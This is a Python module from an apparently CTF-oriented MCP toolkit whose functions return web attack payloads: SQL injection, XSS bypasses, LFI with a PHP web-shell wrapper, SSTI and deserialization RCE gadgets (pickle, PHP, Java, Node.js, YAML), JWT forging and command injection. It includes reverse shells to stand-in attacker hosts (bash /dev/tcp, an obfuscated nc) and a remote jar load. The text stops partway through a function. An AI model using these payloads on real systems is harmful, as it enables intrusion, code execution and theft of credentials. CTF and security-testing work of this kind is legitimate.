"""
Web Security Tools Module for CTF-MCP
SQL injection, XSS, SSTI, JWT, SSRF, XXE, Command Injection,
Deserialization, and other web exploitation tools for CTF challenges
"""

import base64
import json
import re
import urllib.parse
import hashlib
import hmac
import struct
import zlib
from typing import Optional, List, Dict, Union

from ..utils.security import dangerous_operation, RiskLevel


class WebTools:
    """Web security tools for CTF challenges"""

    def get_tools(self) -> dict[str, str]:
        """Return available tools and their descriptions"""
        return {
            # SQL Injection
            "sql_payloads": "Generate SQL injection payloads",
            "sql_waf_bypass": "SQL injection WAF bypass techniques",
            "sql_extract_template": "SQL data extraction templates",
            # XSS
            "xss_payloads": "Generate XSS payloads",
            "xss_filter_bypass": "XSS filter bypass techniques",
            "xss_polyglot": "XSS polyglot payloads",
            # LFI/RFI/Path Traversal
            "lfi_payloads": "Generate LFI payloads",
            "rfi_payloads": "Generate RFI payloads",
            "path_traversal": "Path traversal payloads and bypass",
            # SSTI
            "ssti_payloads": "Generate SSTI payloads",
            "ssti_identify": "Identify template engine",
            # Command Injection
            "cmd_injection": "OS command injection payloads",
            "cmd_blind": "Blind command injection techniques",
            # SSRF
            "ssrf_payloads": "SSRF payloads and bypass techniques",
            "ssrf_protocols": "SSRF protocol handlers",
            "ssrf_cloud_metadata": "Cloud metadata endpoints for SSRF",
            # XXE
            "xxe_payloads": "XXE injection payloads",
            "xxe_oob": "Out-of-band XXE techniques",
            "xxe_blind": "Blind XXE payloads",
            # JWT
            "jwt_decode": "Decode JWT token",
            "jwt_forge": "Forge JWT token",
            "jwt_crack": "JWT secret cracking wordlist",
            "jwt_attacks": "JWT attack techniques",
            # Deserialization
            "php_serialize": "PHP serialization payload",
            "php_unserialize_exploit": "PHP unserialize exploits",
            "pickle_payload": "Python pickle RCE payload",
            "java_deserialize": "Java deserialization payloads",
            "nodejs_deserialize": "Node.js deserialization payloads",
            "yaml_deserialize": "YAML deserialization payloads",
            # Prototype Pollution
            "prototype_pollution": "JavaScript prototype pollution",
            # Open Redirect
            "open_redirect": "Open redirect payloads",
            # CSRF
            "csrf_token_bypass": "CSRF token bypass techniques",
            "csrf_poc_generate": "Generate CSRF PoC HTML",
            # HTTP Security
            "http_smuggling": "HTTP request smuggling payloads",
            "http_header_injection": "HTTP header injection payloads",
            "crlf_injection": "CRLF injection payloads",
            "host_header_attack": "Host header attack payloads",
            # GraphQL
            "graphql_introspection": "GraphQL introspection query",
            "graphql_injection": "GraphQL injection payloads",
            # WebSocket
            "websocket_test": "WebSocket security test payloads",
            # OAuth
            "oauth_attacks": "OAuth vulnerability payloads",
            # Misc Web
            "cors_exploit": "CORS misconfiguration exploit",
            "cache_poison": "Web cache poisoning payloads",
            "pdf_ssrf": "PDF generation SSRF payloads",
            "upload_bypass": "File upload bypass techniques",
            "race_condition": "Race condition exploit templates",
        }

    # === SQL Injection ===

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="SQL injection payloads can be used to extract, modify, or delete database data"
    )
    def sql_payloads(self, dbms: str = "mysql", technique: str = "union") -> str:
        """Generate SQL injection payloads"""
        payloads = {
            "union": {
                "mysql": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT username,password,3 FROM users--",
                    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
                    "' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--",
                    "1' ORDER BY 1--+",
                    "1' ORDER BY 5--+",
                    "-1' UNION SELECT 1,2,3--+",
                ],
                "postgresql": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT version(),NULL,NULL--",
                    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
                ],
                "mssql": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT @@version,NULL,NULL--",
                    "' UNION SELECT name,NULL,NULL FROM master..sysdatabases--",
                    "' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--",
                ],
                "sqlite": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT sqlite_version(),NULL,NULL--",
                    "' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--",
                    "' UNION SELECT sql,NULL,NULL FROM sqlite_master--",
                ],
            },
            "error": {
                "mysql": [
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
                    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
                    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
                    "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
                ],
                "postgresql": [
                    "' AND 1=CAST((SELECT version()) AS INT)--",
                    "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--",
                ],
                "mssql": [
                    "' AND 1=CONVERT(INT,(SELECT @@version))--",
                    "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
                ],
            },
            "blind": {
                "mysql": [
                    "' AND 1=1--",
                    "' AND 1=2--",
                    "' AND SUBSTRING(version(),1,1)='5'--",
                    "' AND (SELECT COUNT(*) FROM users)>0--",
                    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
                    "' AND IF(1=1,SLEEP(0),0)--",
                    "' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(2),0)--",
                ],
            },
            "time": {
                "mysql": [
                    "' AND SLEEP(5)--",
                    "' AND IF(1=1,SLEEP(5),0)--",
                    "' AND BENCHMARK(10000000,SHA1('test'))--",
                ],
                "postgresql": [
                    "' AND pg_sleep(5)--",
                    "'; SELECT pg_sleep(5)--",
                ],
                "mssql": [
                    "'; WAITFOR DELAY '0:0:5'--",
                    "' AND 1=1; WAITFOR DELAY '0:0:5'--",
                ],
            },
        }

        if technique not in payloads:
            return f"Unknown technique. Available: {', '.join(payloads.keys())}"

        technique_payloads = payloads[technique]
        if dbms not in technique_payloads:
            return f"No payloads for {dbms}. Available: {', '.join(technique_payloads.keys())}"

        result = [f"SQL Injection Payloads ({dbms.upper()} - {technique.upper()}):", "-" * 50]
        for payload in technique_payloads[dbms]:
            result.append(payload)

        return '\n'.join(result)

    # === XSS ===

    @dangerous_operation(
        risk_level=RiskLevel.MEDIUM,
        description="XSS payloads can be used to execute malicious JavaScript in victim browsers"
    )
    def xss_payloads(self, context: str = "html", bypass: bool = False) -> str:
        """Generate XSS payloads"""
        payloads = {
            "html": [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<body onload=alert(1)>',
                '<iframe src="javascript:alert(1)">',
                '<marquee onstart=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
            ],
            "attribute": [
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)",
                '" onfocus="alert(1)" autofocus="',
                "' onfocus='alert(1)' autofocus='",
                '" onclick="alert(1)',
            ],
            "script": [
                "'-alert(1)-'",
                '"-alert(1)-"',
                "\\'-alert(1)//",
                '</script><script>alert(1)</script>',
                "';alert(1)//",
            ],
            "url": [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            ],
        }

        bypass_payloads = [
            # Case variations
            '<ScRiPt>alert(1)</ScRiPt>',
            '<IMG SRC=x OnErRoR=alert(1)>',
            # Encoding
            '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
            '<img src=x onerror=\\u0061lert(1)>',
            # Tag breaking
            '<<script>script>alert(1)//<</script>/script>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            # NULL bytes
            '<scr\\x00ipt>alert(1)</script>',
            # Double encoding
            '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
            # SVG
            '<svg/onload=alert(1)>',
            '<svg><script>alert&#40;1&#41;</script>',
            # Event handlers
            '<img src=1 onerror=alert`1`>',
            '<img src=1 onerror=alert(String.fromCharCode(88,83,83))>',
        ]

        if context not in payloads:
            return f"Unknown context. Available: {', '.join(payloads.keys())}"

        result = [f"XSS Payloads ({context.upper()} context):", "-" * 50]
        for payload in payloads[context]:
            result.append(payload)

        if bypass:
            result.append("")
            result.append("WAF Bypass Variants:")
            result.append("-" * 50)
            for payload in bypass_payloads:
                result.append(payload)

        return '\n'.join(result)

    # === LFI/RFI ===

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="Local File Inclusion (LFI) can be used to read sensitive files and potentially achieve remote code execution"
    )
    def lfi_payloads(self, os: str = "linux", wrapper: bool = True) -> str:
        """Generate Local File Inclusion payloads"""
        linux_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/fd/0",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/auth.log",
            "/home/{user}/.ssh/id_rsa",
            "/home/{user}/.bash_history",
            "/root/.bash_history",
            "/root/.ssh/id_rsa",
        ]

        windows_files = [
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Users\\Administrator\\Desktop\\flag.txt",
            "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\",
            "C:\\xampp\\apache\\logs\\access.log",
        ]

        traversal = [
            "../" * i for i in range(1, 10)
        ]

        php_wrappers = [
            "php://filter/convert.base64-encode/resource=",
            "php://filter/read=string.rot13/resource=",
            "php://input",
            "php://data://text/plain,<?php system($_GET['cmd']); ?>",
            "php://data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "expect://id",
            "phar://",
        ]

        files = linux_files if os == "linux" else windows_files

        result = [f"LFI Payloads ({os.upper()}):", "-" * 50]
        result.append("Target Files:")
        for f in files:
            result.append(f"  {f}")

        result.append("")
        result.append("Path Traversal Variants:")
        for t in traversal[:5]:
            result.append(f"  {t}etc/passwd" if os == "linux" else f"  {t}Windows\\win.ini")

        if wrapper:
            result.append("")
            result.append("PHP Wrappers:")
            for w in php_wrappers:
                result.append(f"  {w}")

        result.append("")
        result.append("Bypass Techniques:")
        result.append("  ....//....//etc/passwd")
        result.append("  ..%252f..%252f..%252fetc/passwd")
        result.append("  /etc/passwd%00")
        result.append("  /etc/passwd%00.jpg")

        return '\n'.join(result)

    # === SSTI ===

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="Server-Side Template Injection (SSTI) payloads can execute arbitrary code on the server"
    )
    def ssti_payloads(self, engine: str = "auto") -> str:
        """Generate Server-Side Template Injection payloads"""
        payloads = {
            "detection": [
                "${7*7}",
                "{{7*7}}",
                "#{7*7}",
                "<%= 7*7 %>",
                "${{7*7}}",
                "{7*7}",
                "{{7*'7'}}",
            ],
            "jinja2": [
                "{{config}}",
                "{{config.items()}}",
                "{{self.__init__.__globals__.__builtins__}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %}",
            ],
            "twig": [
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('exec')}}",
                "{{app.request.server.all|join(',')}}",
            ],
            "freemarker": [
                "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
            ],
            "velocity": [
                "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($chr=$x.class.forName('java.lang.Character'))##\n#set($str=$x.class.forName('java.lang.String'))##\n#set($ex=$rt.getRuntime().exec('id'))##",
            ],
        }

        result = ["SSTI Payloads:", "-" * 50]

        if engine == "auto":
            result.append("Detection Payloads (try these first):")
            for payload in payloads["detection"]:
                result.append(f"  {payload}")
            result.append("")
            result.append("If 49 appears, try Jinja2/Twig payloads")
            result.append("If 7777777 appears, try Jinja2 payloads")
        else:
            if engine not in payloads:
                return f"Unknown engine. Available: {', '.join(payloads.keys())}"

        for eng, pays in payloads.items():
            if engine == "auto" or engine == eng:
                result.append("")
                result.append(f"{eng.upper()} Payloads:")
                for payload in pays:
                    result.append(f"  {payload}")

        return '\n'.join(result)

    # === JWT ===

    def jwt_decode(self, token: str) -> str:
        """Decode and analyze JWT token"""
        parts = token.split('.')
        if len(parts) != 3:
            return "Invalid JWT format (expected 3 parts separated by '.')"

        result = ["JWT Token Analysis:", "-" * 50]

        try:
            # Decode header
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))
            result.append(f"Header: {json.dumps(header, indent=2)}")

            # Decode payload
            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))
            result.append(f"\nPayload: {json.dumps(payload, indent=2)}")

            # Signature (base64)
            result.append(f"\nSignature (base64): {parts[2]}")

            # Security analysis
            result.append("\n" + "-" * 50)
            result.append("Security Analysis:")

            if header.get('alg') == 'none':
                result.append("  [!] Algorithm 'none' - Token may be vulnerable!")
            if header.get('alg') == 'HS256':
                result.append("  [*] HS256 - Try brute-forcing weak secrets")
            if header.get('alg') in ['RS256', 'RS384', 'RS512']:
                result.append("  [*] RSA algorithm - Try algorithm confusion attack")

            # Check for sensitive data
            sensitive_keys = ['password', 'secret', 'key', 'token', 'admin', 'role']
            for key in payload:
                if any(s in key.lower() for s in sensitive_keys):
                    result.append(f"  [!] Potentially sensitive field: {key}")

        except Exception as e:
            result.append(f"Decode error: {e}")

        return '\n'.join(result)

    def jwt_forge(self, token: str, payload_changes: dict = None, attack: str = "none") -> str:
        """Forge JWT token with none algorithm or other attacks"""
        parts = token.split('.')
        if len(parts) != 3:
            return "Invalid JWT format"

        try:
            # Decode original
            header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_padded))

            payload_padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_padded))

            result = ["JWT Forging:", "-" * 50]

            if attack == "none":
                # None algorithm attack
                header['alg'] = 'none'
                if payload_changes:
                    payload.update(payload_changes)

                new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

                forged_tokens = [
                    f"{new_header}.{new_payload}.",
                    f"{new_header}.{new_payload}.{parts[2]}",
                ]

                result.append("None Algorithm Attack Tokens:")
                for t in forged_tokens:
                    result.append(f"  {t}")

            elif attack == "weak_secret":
                result.append("Common weak secrets to try:")
                weak_secrets = [
                    "secret", "password", "123456", "admin", "key",
                    "private", "jwt", "token", "auth", "test",
                    "supersecret", "changeme", "default"
                ]
                for s in weak_secrets:
                    result.append(f"  {s}")

                result.append("\nUse jwt_tool or jwt-cracker to bruteforce")

            result.append(f"\nModified Header: {json.dumps(header)}")
            result.append(f"Modified Payload: {json.dumps(payload)}")

        except Exception as e:
            return f"Forge error: {e}"

        return '\n'.join(result)

    def jwt_crack(self, algorithm: str = "HS256") -> str:
        """Common JWT secrets wordlist"""
        weak_secrets = [
            "secret", "password", "123456", "admin", "key", "private",
            "jwt", "token", "auth", "test", "supersecret", "changeme",
            "default", "pass", "root", "toor", "guest", "login",
            "qwerty", "letmein", "welcome", "shadow", "sunshine",
            "password1", "password123", "abc123", "123456789",
            "000000", "111111", "12345", "1234567", "12345678",
            "qwerty123", "1q2w3e4r", "admin123", "passw0rd",
            "iloveyou", "monkey", "dragon", "master", "access",
            "mustang", "access14", "superman", "batman", "trustno1",
            "gfhjkm", "qazwsx", "zxcvbn", "zxcvbnm", "!@#$%^&*",
            "HS256-key", "RS256-key", "jwt-secret", "my-secret-key",
            "your-256-bit-secret", "my_super_secret_key_123",
        ]

        result = ["JWT Secret Cracking Wordlist:", "-" * 50]
        result.append(f"Algorithm: {algorithm}")
        result.append("")
        result.append("Common weak secrets:")
        for s in weak_secrets:
            result.append(f"  {s}")

        result.append("")
        result.append("Tools for JWT cracking:")
        result.append("  - jwt_tool: python3 jwt_tool.py <token> -C -d wordlist.txt")
        result.append("  - hashcat: hashcat -m 16500 jwt.txt wordlist.txt")
        result.append("  - john: john --wordlist=wordlist.txt jwt.txt")

        return '\n'.join(result)

    def jwt_attacks(self, attack_type: str = "all") -> str:
        """JWT attack techniques and payloads"""
        attacks = {
            "none_algorithm": {
                "description": "Change algorithm to 'none' to skip signature verification",
                "header": '{"alg":"none","typ":"JWT"}',
                "note": "Try: alg='none', 'None', 'NONE', 'nOnE'"
            },
            "algorithm_confusion": {
                "description": "Change RS256 to HS256, use public key as HMAC secret",
                "steps": [
                    "1. Get the public key (from /jwt/public or certificate)",
                    "2. Change header alg from RS256 to HS256",
                    "3. Sign with public key as HMAC secret",
                    "4. Send forged token"
                ],
                "python_code": '''
import jwt
import base64

public_key = open('public.pem').read()
payload = {"user": "admin"}
token = jwt.encode(payload, public_key, algorithm='HS256')
'''
            },
            "kid_injection": {
                "description": "Inject path/SQL into 'kid' header parameter",
                "payloads": [
                    '{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}',
                    '{"alg":"HS256","typ":"JWT","kid":"path/to/file"}',
                    '{"alg":"HS256","typ":"JWT","kid":"key\' UNION SELECT \'secret\'--"}',
                    '{"alg":"HS256","typ":"JWT","kid":"key|/etc/passwd"}',
                ]
            },
            "jku_spoofing": {
                "description": "Point jku (JWK Set URL) to attacker-controlled server",
                "header": '{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/.well-known/jwks.json"}'
            },
            "x5u_spoofing": {
                "description": "Point x5u (X.509 URL) to attacker-controlled certificate",
                "header": '{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}'
            },
            "exp_bypass": {
                "description": "Modify/remove expiration claim",
                "techniques": [
                    "Remove 'exp' claim entirely",
                    "Set 'exp' to far future timestamp",
                    "Set 'exp' to negative value",
                ]
            }
        }

        result = ["JWT Attack Techniques:", "-" * 50]

        for attack_name, info in attacks.items():
            if attack_type == "all" or attack_type == attack_name:
                result.append(f"\n=== {attack_name.upper()} ===")
                result.append(f"Description: {info['description']}")

                if 'header' in info:
                    result.append(f"Header: {info['header']}")
                if 'payloads' in info:
                    result.append("Payloads:")
                    for p in info['payloads']:
                        result.append(f"  {p}")
                if 'steps' in info:
                    result.append("Steps:")
                    for s in info['steps']:
                        result.append(f"  {s}")
                if 'techniques' in info:
                    result.append("Techniques:")
                    for t in info['techniques']:
                        result.append(f"  - {t}")
                if 'python_code' in info:
                    result.append(f"Python code:{info['python_code']}")

        return '\n'.join(result)

    # === Deserialization ===

    def php_serialize(self, data: dict) -> str:
        """Generate PHP serialized payload"""
        # Simple PHP serialization for common types
        result = []

        def serialize_value(val):
            if val is None:
                return "N;"
            elif isinstance(val, bool):
                return f"b:{1 if val else 0};"
            elif isinstance(val, int):
                return f"i:{val};"
            elif isinstance(val, float):
                return f"d:{val};"
            elif isinstance(val, str):
                return f's:{len(val)}:"{val}";'
            elif isinstance(val, list):
                items = ''.join(f"i:{i};{serialize_value(v)}" for i, v in enumerate(val))
                return f"a:{len(val)}:{{{items}}}"
            elif isinstance(val, dict):
                items = ''.join(f"{serialize_value(k)}{serialize_value(v)}" for k, v in val.items())
                return f"a:{len(val)}:{{{items}}}"
            return "N;"

        serialized = serialize_value(data)
        return f"PHP Serialized: {serialized}"

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="Python pickle deserialization can execute arbitrary code (RCE)"
    )
    def pickle_payload(self) -> str:
        """Generate Python pickle RCE payload templates"""
        payloads = [
            """
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
""",
            """
# Alternative using subprocess
import pickle
import base64

class RCE:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['id'],))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
""",
        ]

        result = ["Python Pickle RCE Payloads:", "-" * 50]
        result.append("Generate payload with these Python scripts:")
        for i, p in enumerate(payloads, 1):
            result.append(f"\n--- Payload Template {i} ---")
            result.append(p)

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="PHP unserialize exploits can lead to remote code execution through gadget chains"
    )
    def php_unserialize_exploit(self, gadget: str = "all") -> str:
        """PHP unserialize exploits with common gadget chains"""
        gadgets = {
            "phar": {
                "description": "PHAR deserialization (file:// or phar://) - works even with is_file, file_exists",
                "payload": '''<?php
class Exploit {
    public $cmd = "id";
    function __destruct() {
        system($this->cmd);
    }
}

// Create PHAR
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();

// Trigger: phar://exploit.phar/test.txt
// Or: phar://exploit.phar
?>'''
            },
            "laravel": {
                "description": "Laravel POP chain gadget",
                "payload": '''O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\\x00*\\x00events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"\\x00*\\x00listeners";a:1:{s:2:"id";a:1:{i:0;s:6:"system";}}}s:8:"\\x00*\\x00event";s:2:"id";}'''
            },
            "symfony": {
                "description": "Symfony process gadget",
                "payload": '''O:36:"Symfony\\Component\\Process\\Process":3:{s:45:"\\x00Symfony\\Component\\Process\\Process\\x00callback";s:6:"system";s:50:"\\x00Symfony\\Component\\Process\\Process\\x00commandline";s:2:"id";s:45:"\\x00Symfony\\Component\\Process\\Process\\x00cwd";N;}'''
            },
            "magento": {
                "description": "Magento Webshop POP chain",
                "note": "Use PHPGGC: phpggc Magento/FW1 <file> <content>"
            },
            "wordpress": {
                "description": "WordPress POP chain (PHPMailer)",
                "note": "Use PHPGGC: phpggc WordPress/PHPMailer/RCE1 <cmd>"
            }
        }

        result = ["PHP Unserialize Exploits:", "-" * 50]
        result.append("Tool: PHPGGC (https://github.com/ambionics/phpggc)")
        result.append("")

        for name, info in gadgets.items():
            if gadget == "all" or gadget == name:
                result.append(f"=== {name.upper()} ===")
                result.append(f"Description: {info['description']}")
                if 'payload' in info:
                    result.append(f"Payload:\n{info['payload']}")
                if 'note' in info:
                    result.append(f"Note: {info['note']}")
                result.append("")

        result.append("Common magic methods exploited:")
        result.append("  __destruct(), __wakeup(), __toString(), __call()")

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="Java deserialization can lead to remote code execution through gadget chains like ysoserial"
    )
    def java_deserialize(self, gadget: str = "all") -> str:
        """Java deserialization payloads and tools"""
        gadgets = {
            "commons_collections": {
                "description": "Apache Commons Collections gadget chain",
                "ysoserial": "java -jar ysoserial.jar CommonsCollections1 'id'",
                "signature": "ac ed 00 05 (serialized Java object header)"
            },
            "commons_beanutils": {
                "description": "Apache Commons BeanUtils gadget chain",
                "ysoserial": "java -jar ysoserial.jar CommonsBeanutils1 'id'"
            },
            "spring": {
                "description": "Spring Framework gadget chain",
                "ysoserial": "java -jar ysoserial.jar Spring1 'id'"
            },
            "jdk7u21": {
                "description": "JDK7u21 native gadget (no external libs)",
                "ysoserial": "java -jar ysoserial.jar Jdk7u21 'id'"
            },
            "jrmp": {
                "description": "JRMP client gadget for two-stage attack",
                "ysoserial": "java -jar ysoserial.jar JRMPClient 'attacker:1099'"
            },
            "dns_lookup": {
                "description": "URLDNS - safe DNS lookup for testing",
                "ysoserial": "java -jar ysoserial.jar URLDNS 'http://attacker.com'"
            }
        }

        result = ["Java Deserialization Payloads:", "-" * 50]
        result.append("Primary Tool: ysoserial (https://github.com/frohoff/ysoserial)")
        result.append("")

        result.append("Detection signatures:")
        result.append("  - Magic bytes: ac ed 00 05 (hex) / rO0AB (base64)")
        result.append("  - Content-Type: application/x-java-serialized-object")
        result.append("")

        for name, info in gadgets.items():
            if gadget == "all" or gadget == name:
                result.append(f"=== {name.upper()} ===")
                result.append(f"Description: {info['description']}")
                result.append(f"ysoserial: {info['ysoserial']}")
                result.append("")

        result.append("Alternative tools:")
        result.append("  - marshalsec: Java unmarshaller vulnerabilities")
        result.append("  - SerializationDumper: Analyze serialized objects")
        result.append("  - GadgetProbe: Identify remote classpath")

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="Node.js deserialization can execute arbitrary code (RCE)"
    )
    def nodejs_deserialize(self) -> str:
        """Node.js deserialization payloads"""
        payloads = {
            "node-serialize": {
                "description": "node-serialize RCE via IIFE",
                "payload": '''{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(error,stdout,stderr){console.log(stdout)})}()"}''',
                "one_liner": """{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}"""
            },
            "serialize-to-js": {
                "description": "serialize-to-js RCE",
                "payload": '''{"__proto__":{"polluted":"yes"}}'''
            },
            "funcster": {
                "description": "funcster module RCE",
                "payload": '''{"__js_function":"function(){require('child_process').exec('id')}()"}'''
            }
        }

        result = ["Node.js Deserialization Payloads:", "-" * 50]
        result.append("")

        for name, info in payloads.items():
            result.append(f"=== {name} ===")
            result.append(f"Description: {info['description']}")
            result.append(f"Payload: {info['payload']}")
            if 'one_liner' in info:
                result.append(f"One-liner: {info['one_liner']}")
            result.append("")

        result.append("Reverse shell payload:")
        result.append('''{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \\"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\\"')}()"}''')

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="YAML deserialization can execute arbitrary code (RCE)"
    )
    def yaml_deserialize(self, library: str = "all") -> str:
        """YAML deserialization payloads"""
        payloads = {
            "pyyaml": {
                "description": "PyYAML unsafe load RCE",
                "payloads": [
                    '''!!python/object/apply:os.system ["id"]''',
                    '''!!python/object/apply:subprocess.check_output [["id"]]''',
                    '''!!python/object/new:subprocess.check_output [["id"]]''',
                    '''!!python/object/apply:os.popen ["id"]''',
                ]
            },
            "snakeyaml": {
                "description": "SnakeYAML (Java) RCE",
                "payloads": [
                    '''!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/exploit.jar"]]]]''',
                    '''!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "rmi://attacker:1099/Exploit", autoCommit: true}''',
                ]
            },
            "ruby": {
                "description": "Ruby YAML.load RCE",
                "payloads": [
                    '''--- !ruby/object:Gem::Installer i: x''',
                    '''--- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::DependencyList specs: - !ruby/object:Gem::Source uri: "| id"''',
                ]
            }
        }

        result = ["YAML Deserialization Payloads:", "-" * 50]
        result.append("")

        for lib, info in payloads.items():
            if library == "all" or library == lib:
                result.append(f"=== {lib.upper()} ===")
                result.append(f"Description: {info['description']}")
                result.append("Payloads:")
                for p in info['payloads']:
                    result.append(f"  {p}")
                result.append("")

        return '\n'.join(result)

    # === Command Injection ===

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="Command injection payloads can execute arbitrary OS commands"
    )
    def cmd_injection(self, os_type: str = "linux", context: str = "basic") -> str:
        """OS command injection payloads"""
        linux_payloads = {
            "basic": [
                "; id",
                "| id",
                "|| id",
                "&& id",
                "& id",
                "$(id)",
                "`id`",
                "\n id",
                "\r\n id",
            ],
            "bypass": [
                ";{id,}",
                "| {id}",
                ";$IFS'id'",
                ";i]d",  # Missing character
                "$(printf '\\x69\\x64')",  # Hex encoded 'id'
                "$'\\x69\\x64'",  # Bash ANSI-C quoting
                ";{`id`}",
                "$(id | base64)",
                ";$(echo aWQ= | base64 -d)",  # base64 'id'
            ],
            "spaces_bypass": [
                ";cat${IFS}/etc/passwd",
                ";cat$IFS/etc/passwd",
                ";{cat,/etc/passwd}",
                ";cat</etc/passwd",
                ";cat%09/etc/passwd",  # Tab
                "X=$'cat\\x20/etc/passwd'&&$X",
                ";cat$u/etc$u/passwd",
            ],
            "filter_bypass": [
                "c''at /etc/passwd",
                "c\"\"at /etc/passwd",
                "c\\at /etc/passwd",
                "/???/??t /???/p??s??",  # Wildcard: /bin/cat /etc/passwd
                "/???/n? -e /???/b??? attacker 4444",  # nc reverse shell
            ]
        }

        windows_payloads = {
            "basic": [
                "& whoami",
                "| whoami",
                "|| whoami",
                "&& whoami",
                "\n whoami",
            ],
            "bypass": [
                "^&whoami",
                "w^h^o^a^m^i",
                "who\"\"ami",
                "who''ami",
                "cmd /c whoami",
                "powershell whoami",
                "%COMSPEC% /c whoami",
            ]
        }

        payloads = linux_payloads if os_type == "linux" else windows_payloads

        result = [f"Command Injection Payloads ({os_type.upper()}):", "-" * 50]

        if context in payloads:
            result.append(f"\n{context.upper()} payloads:")
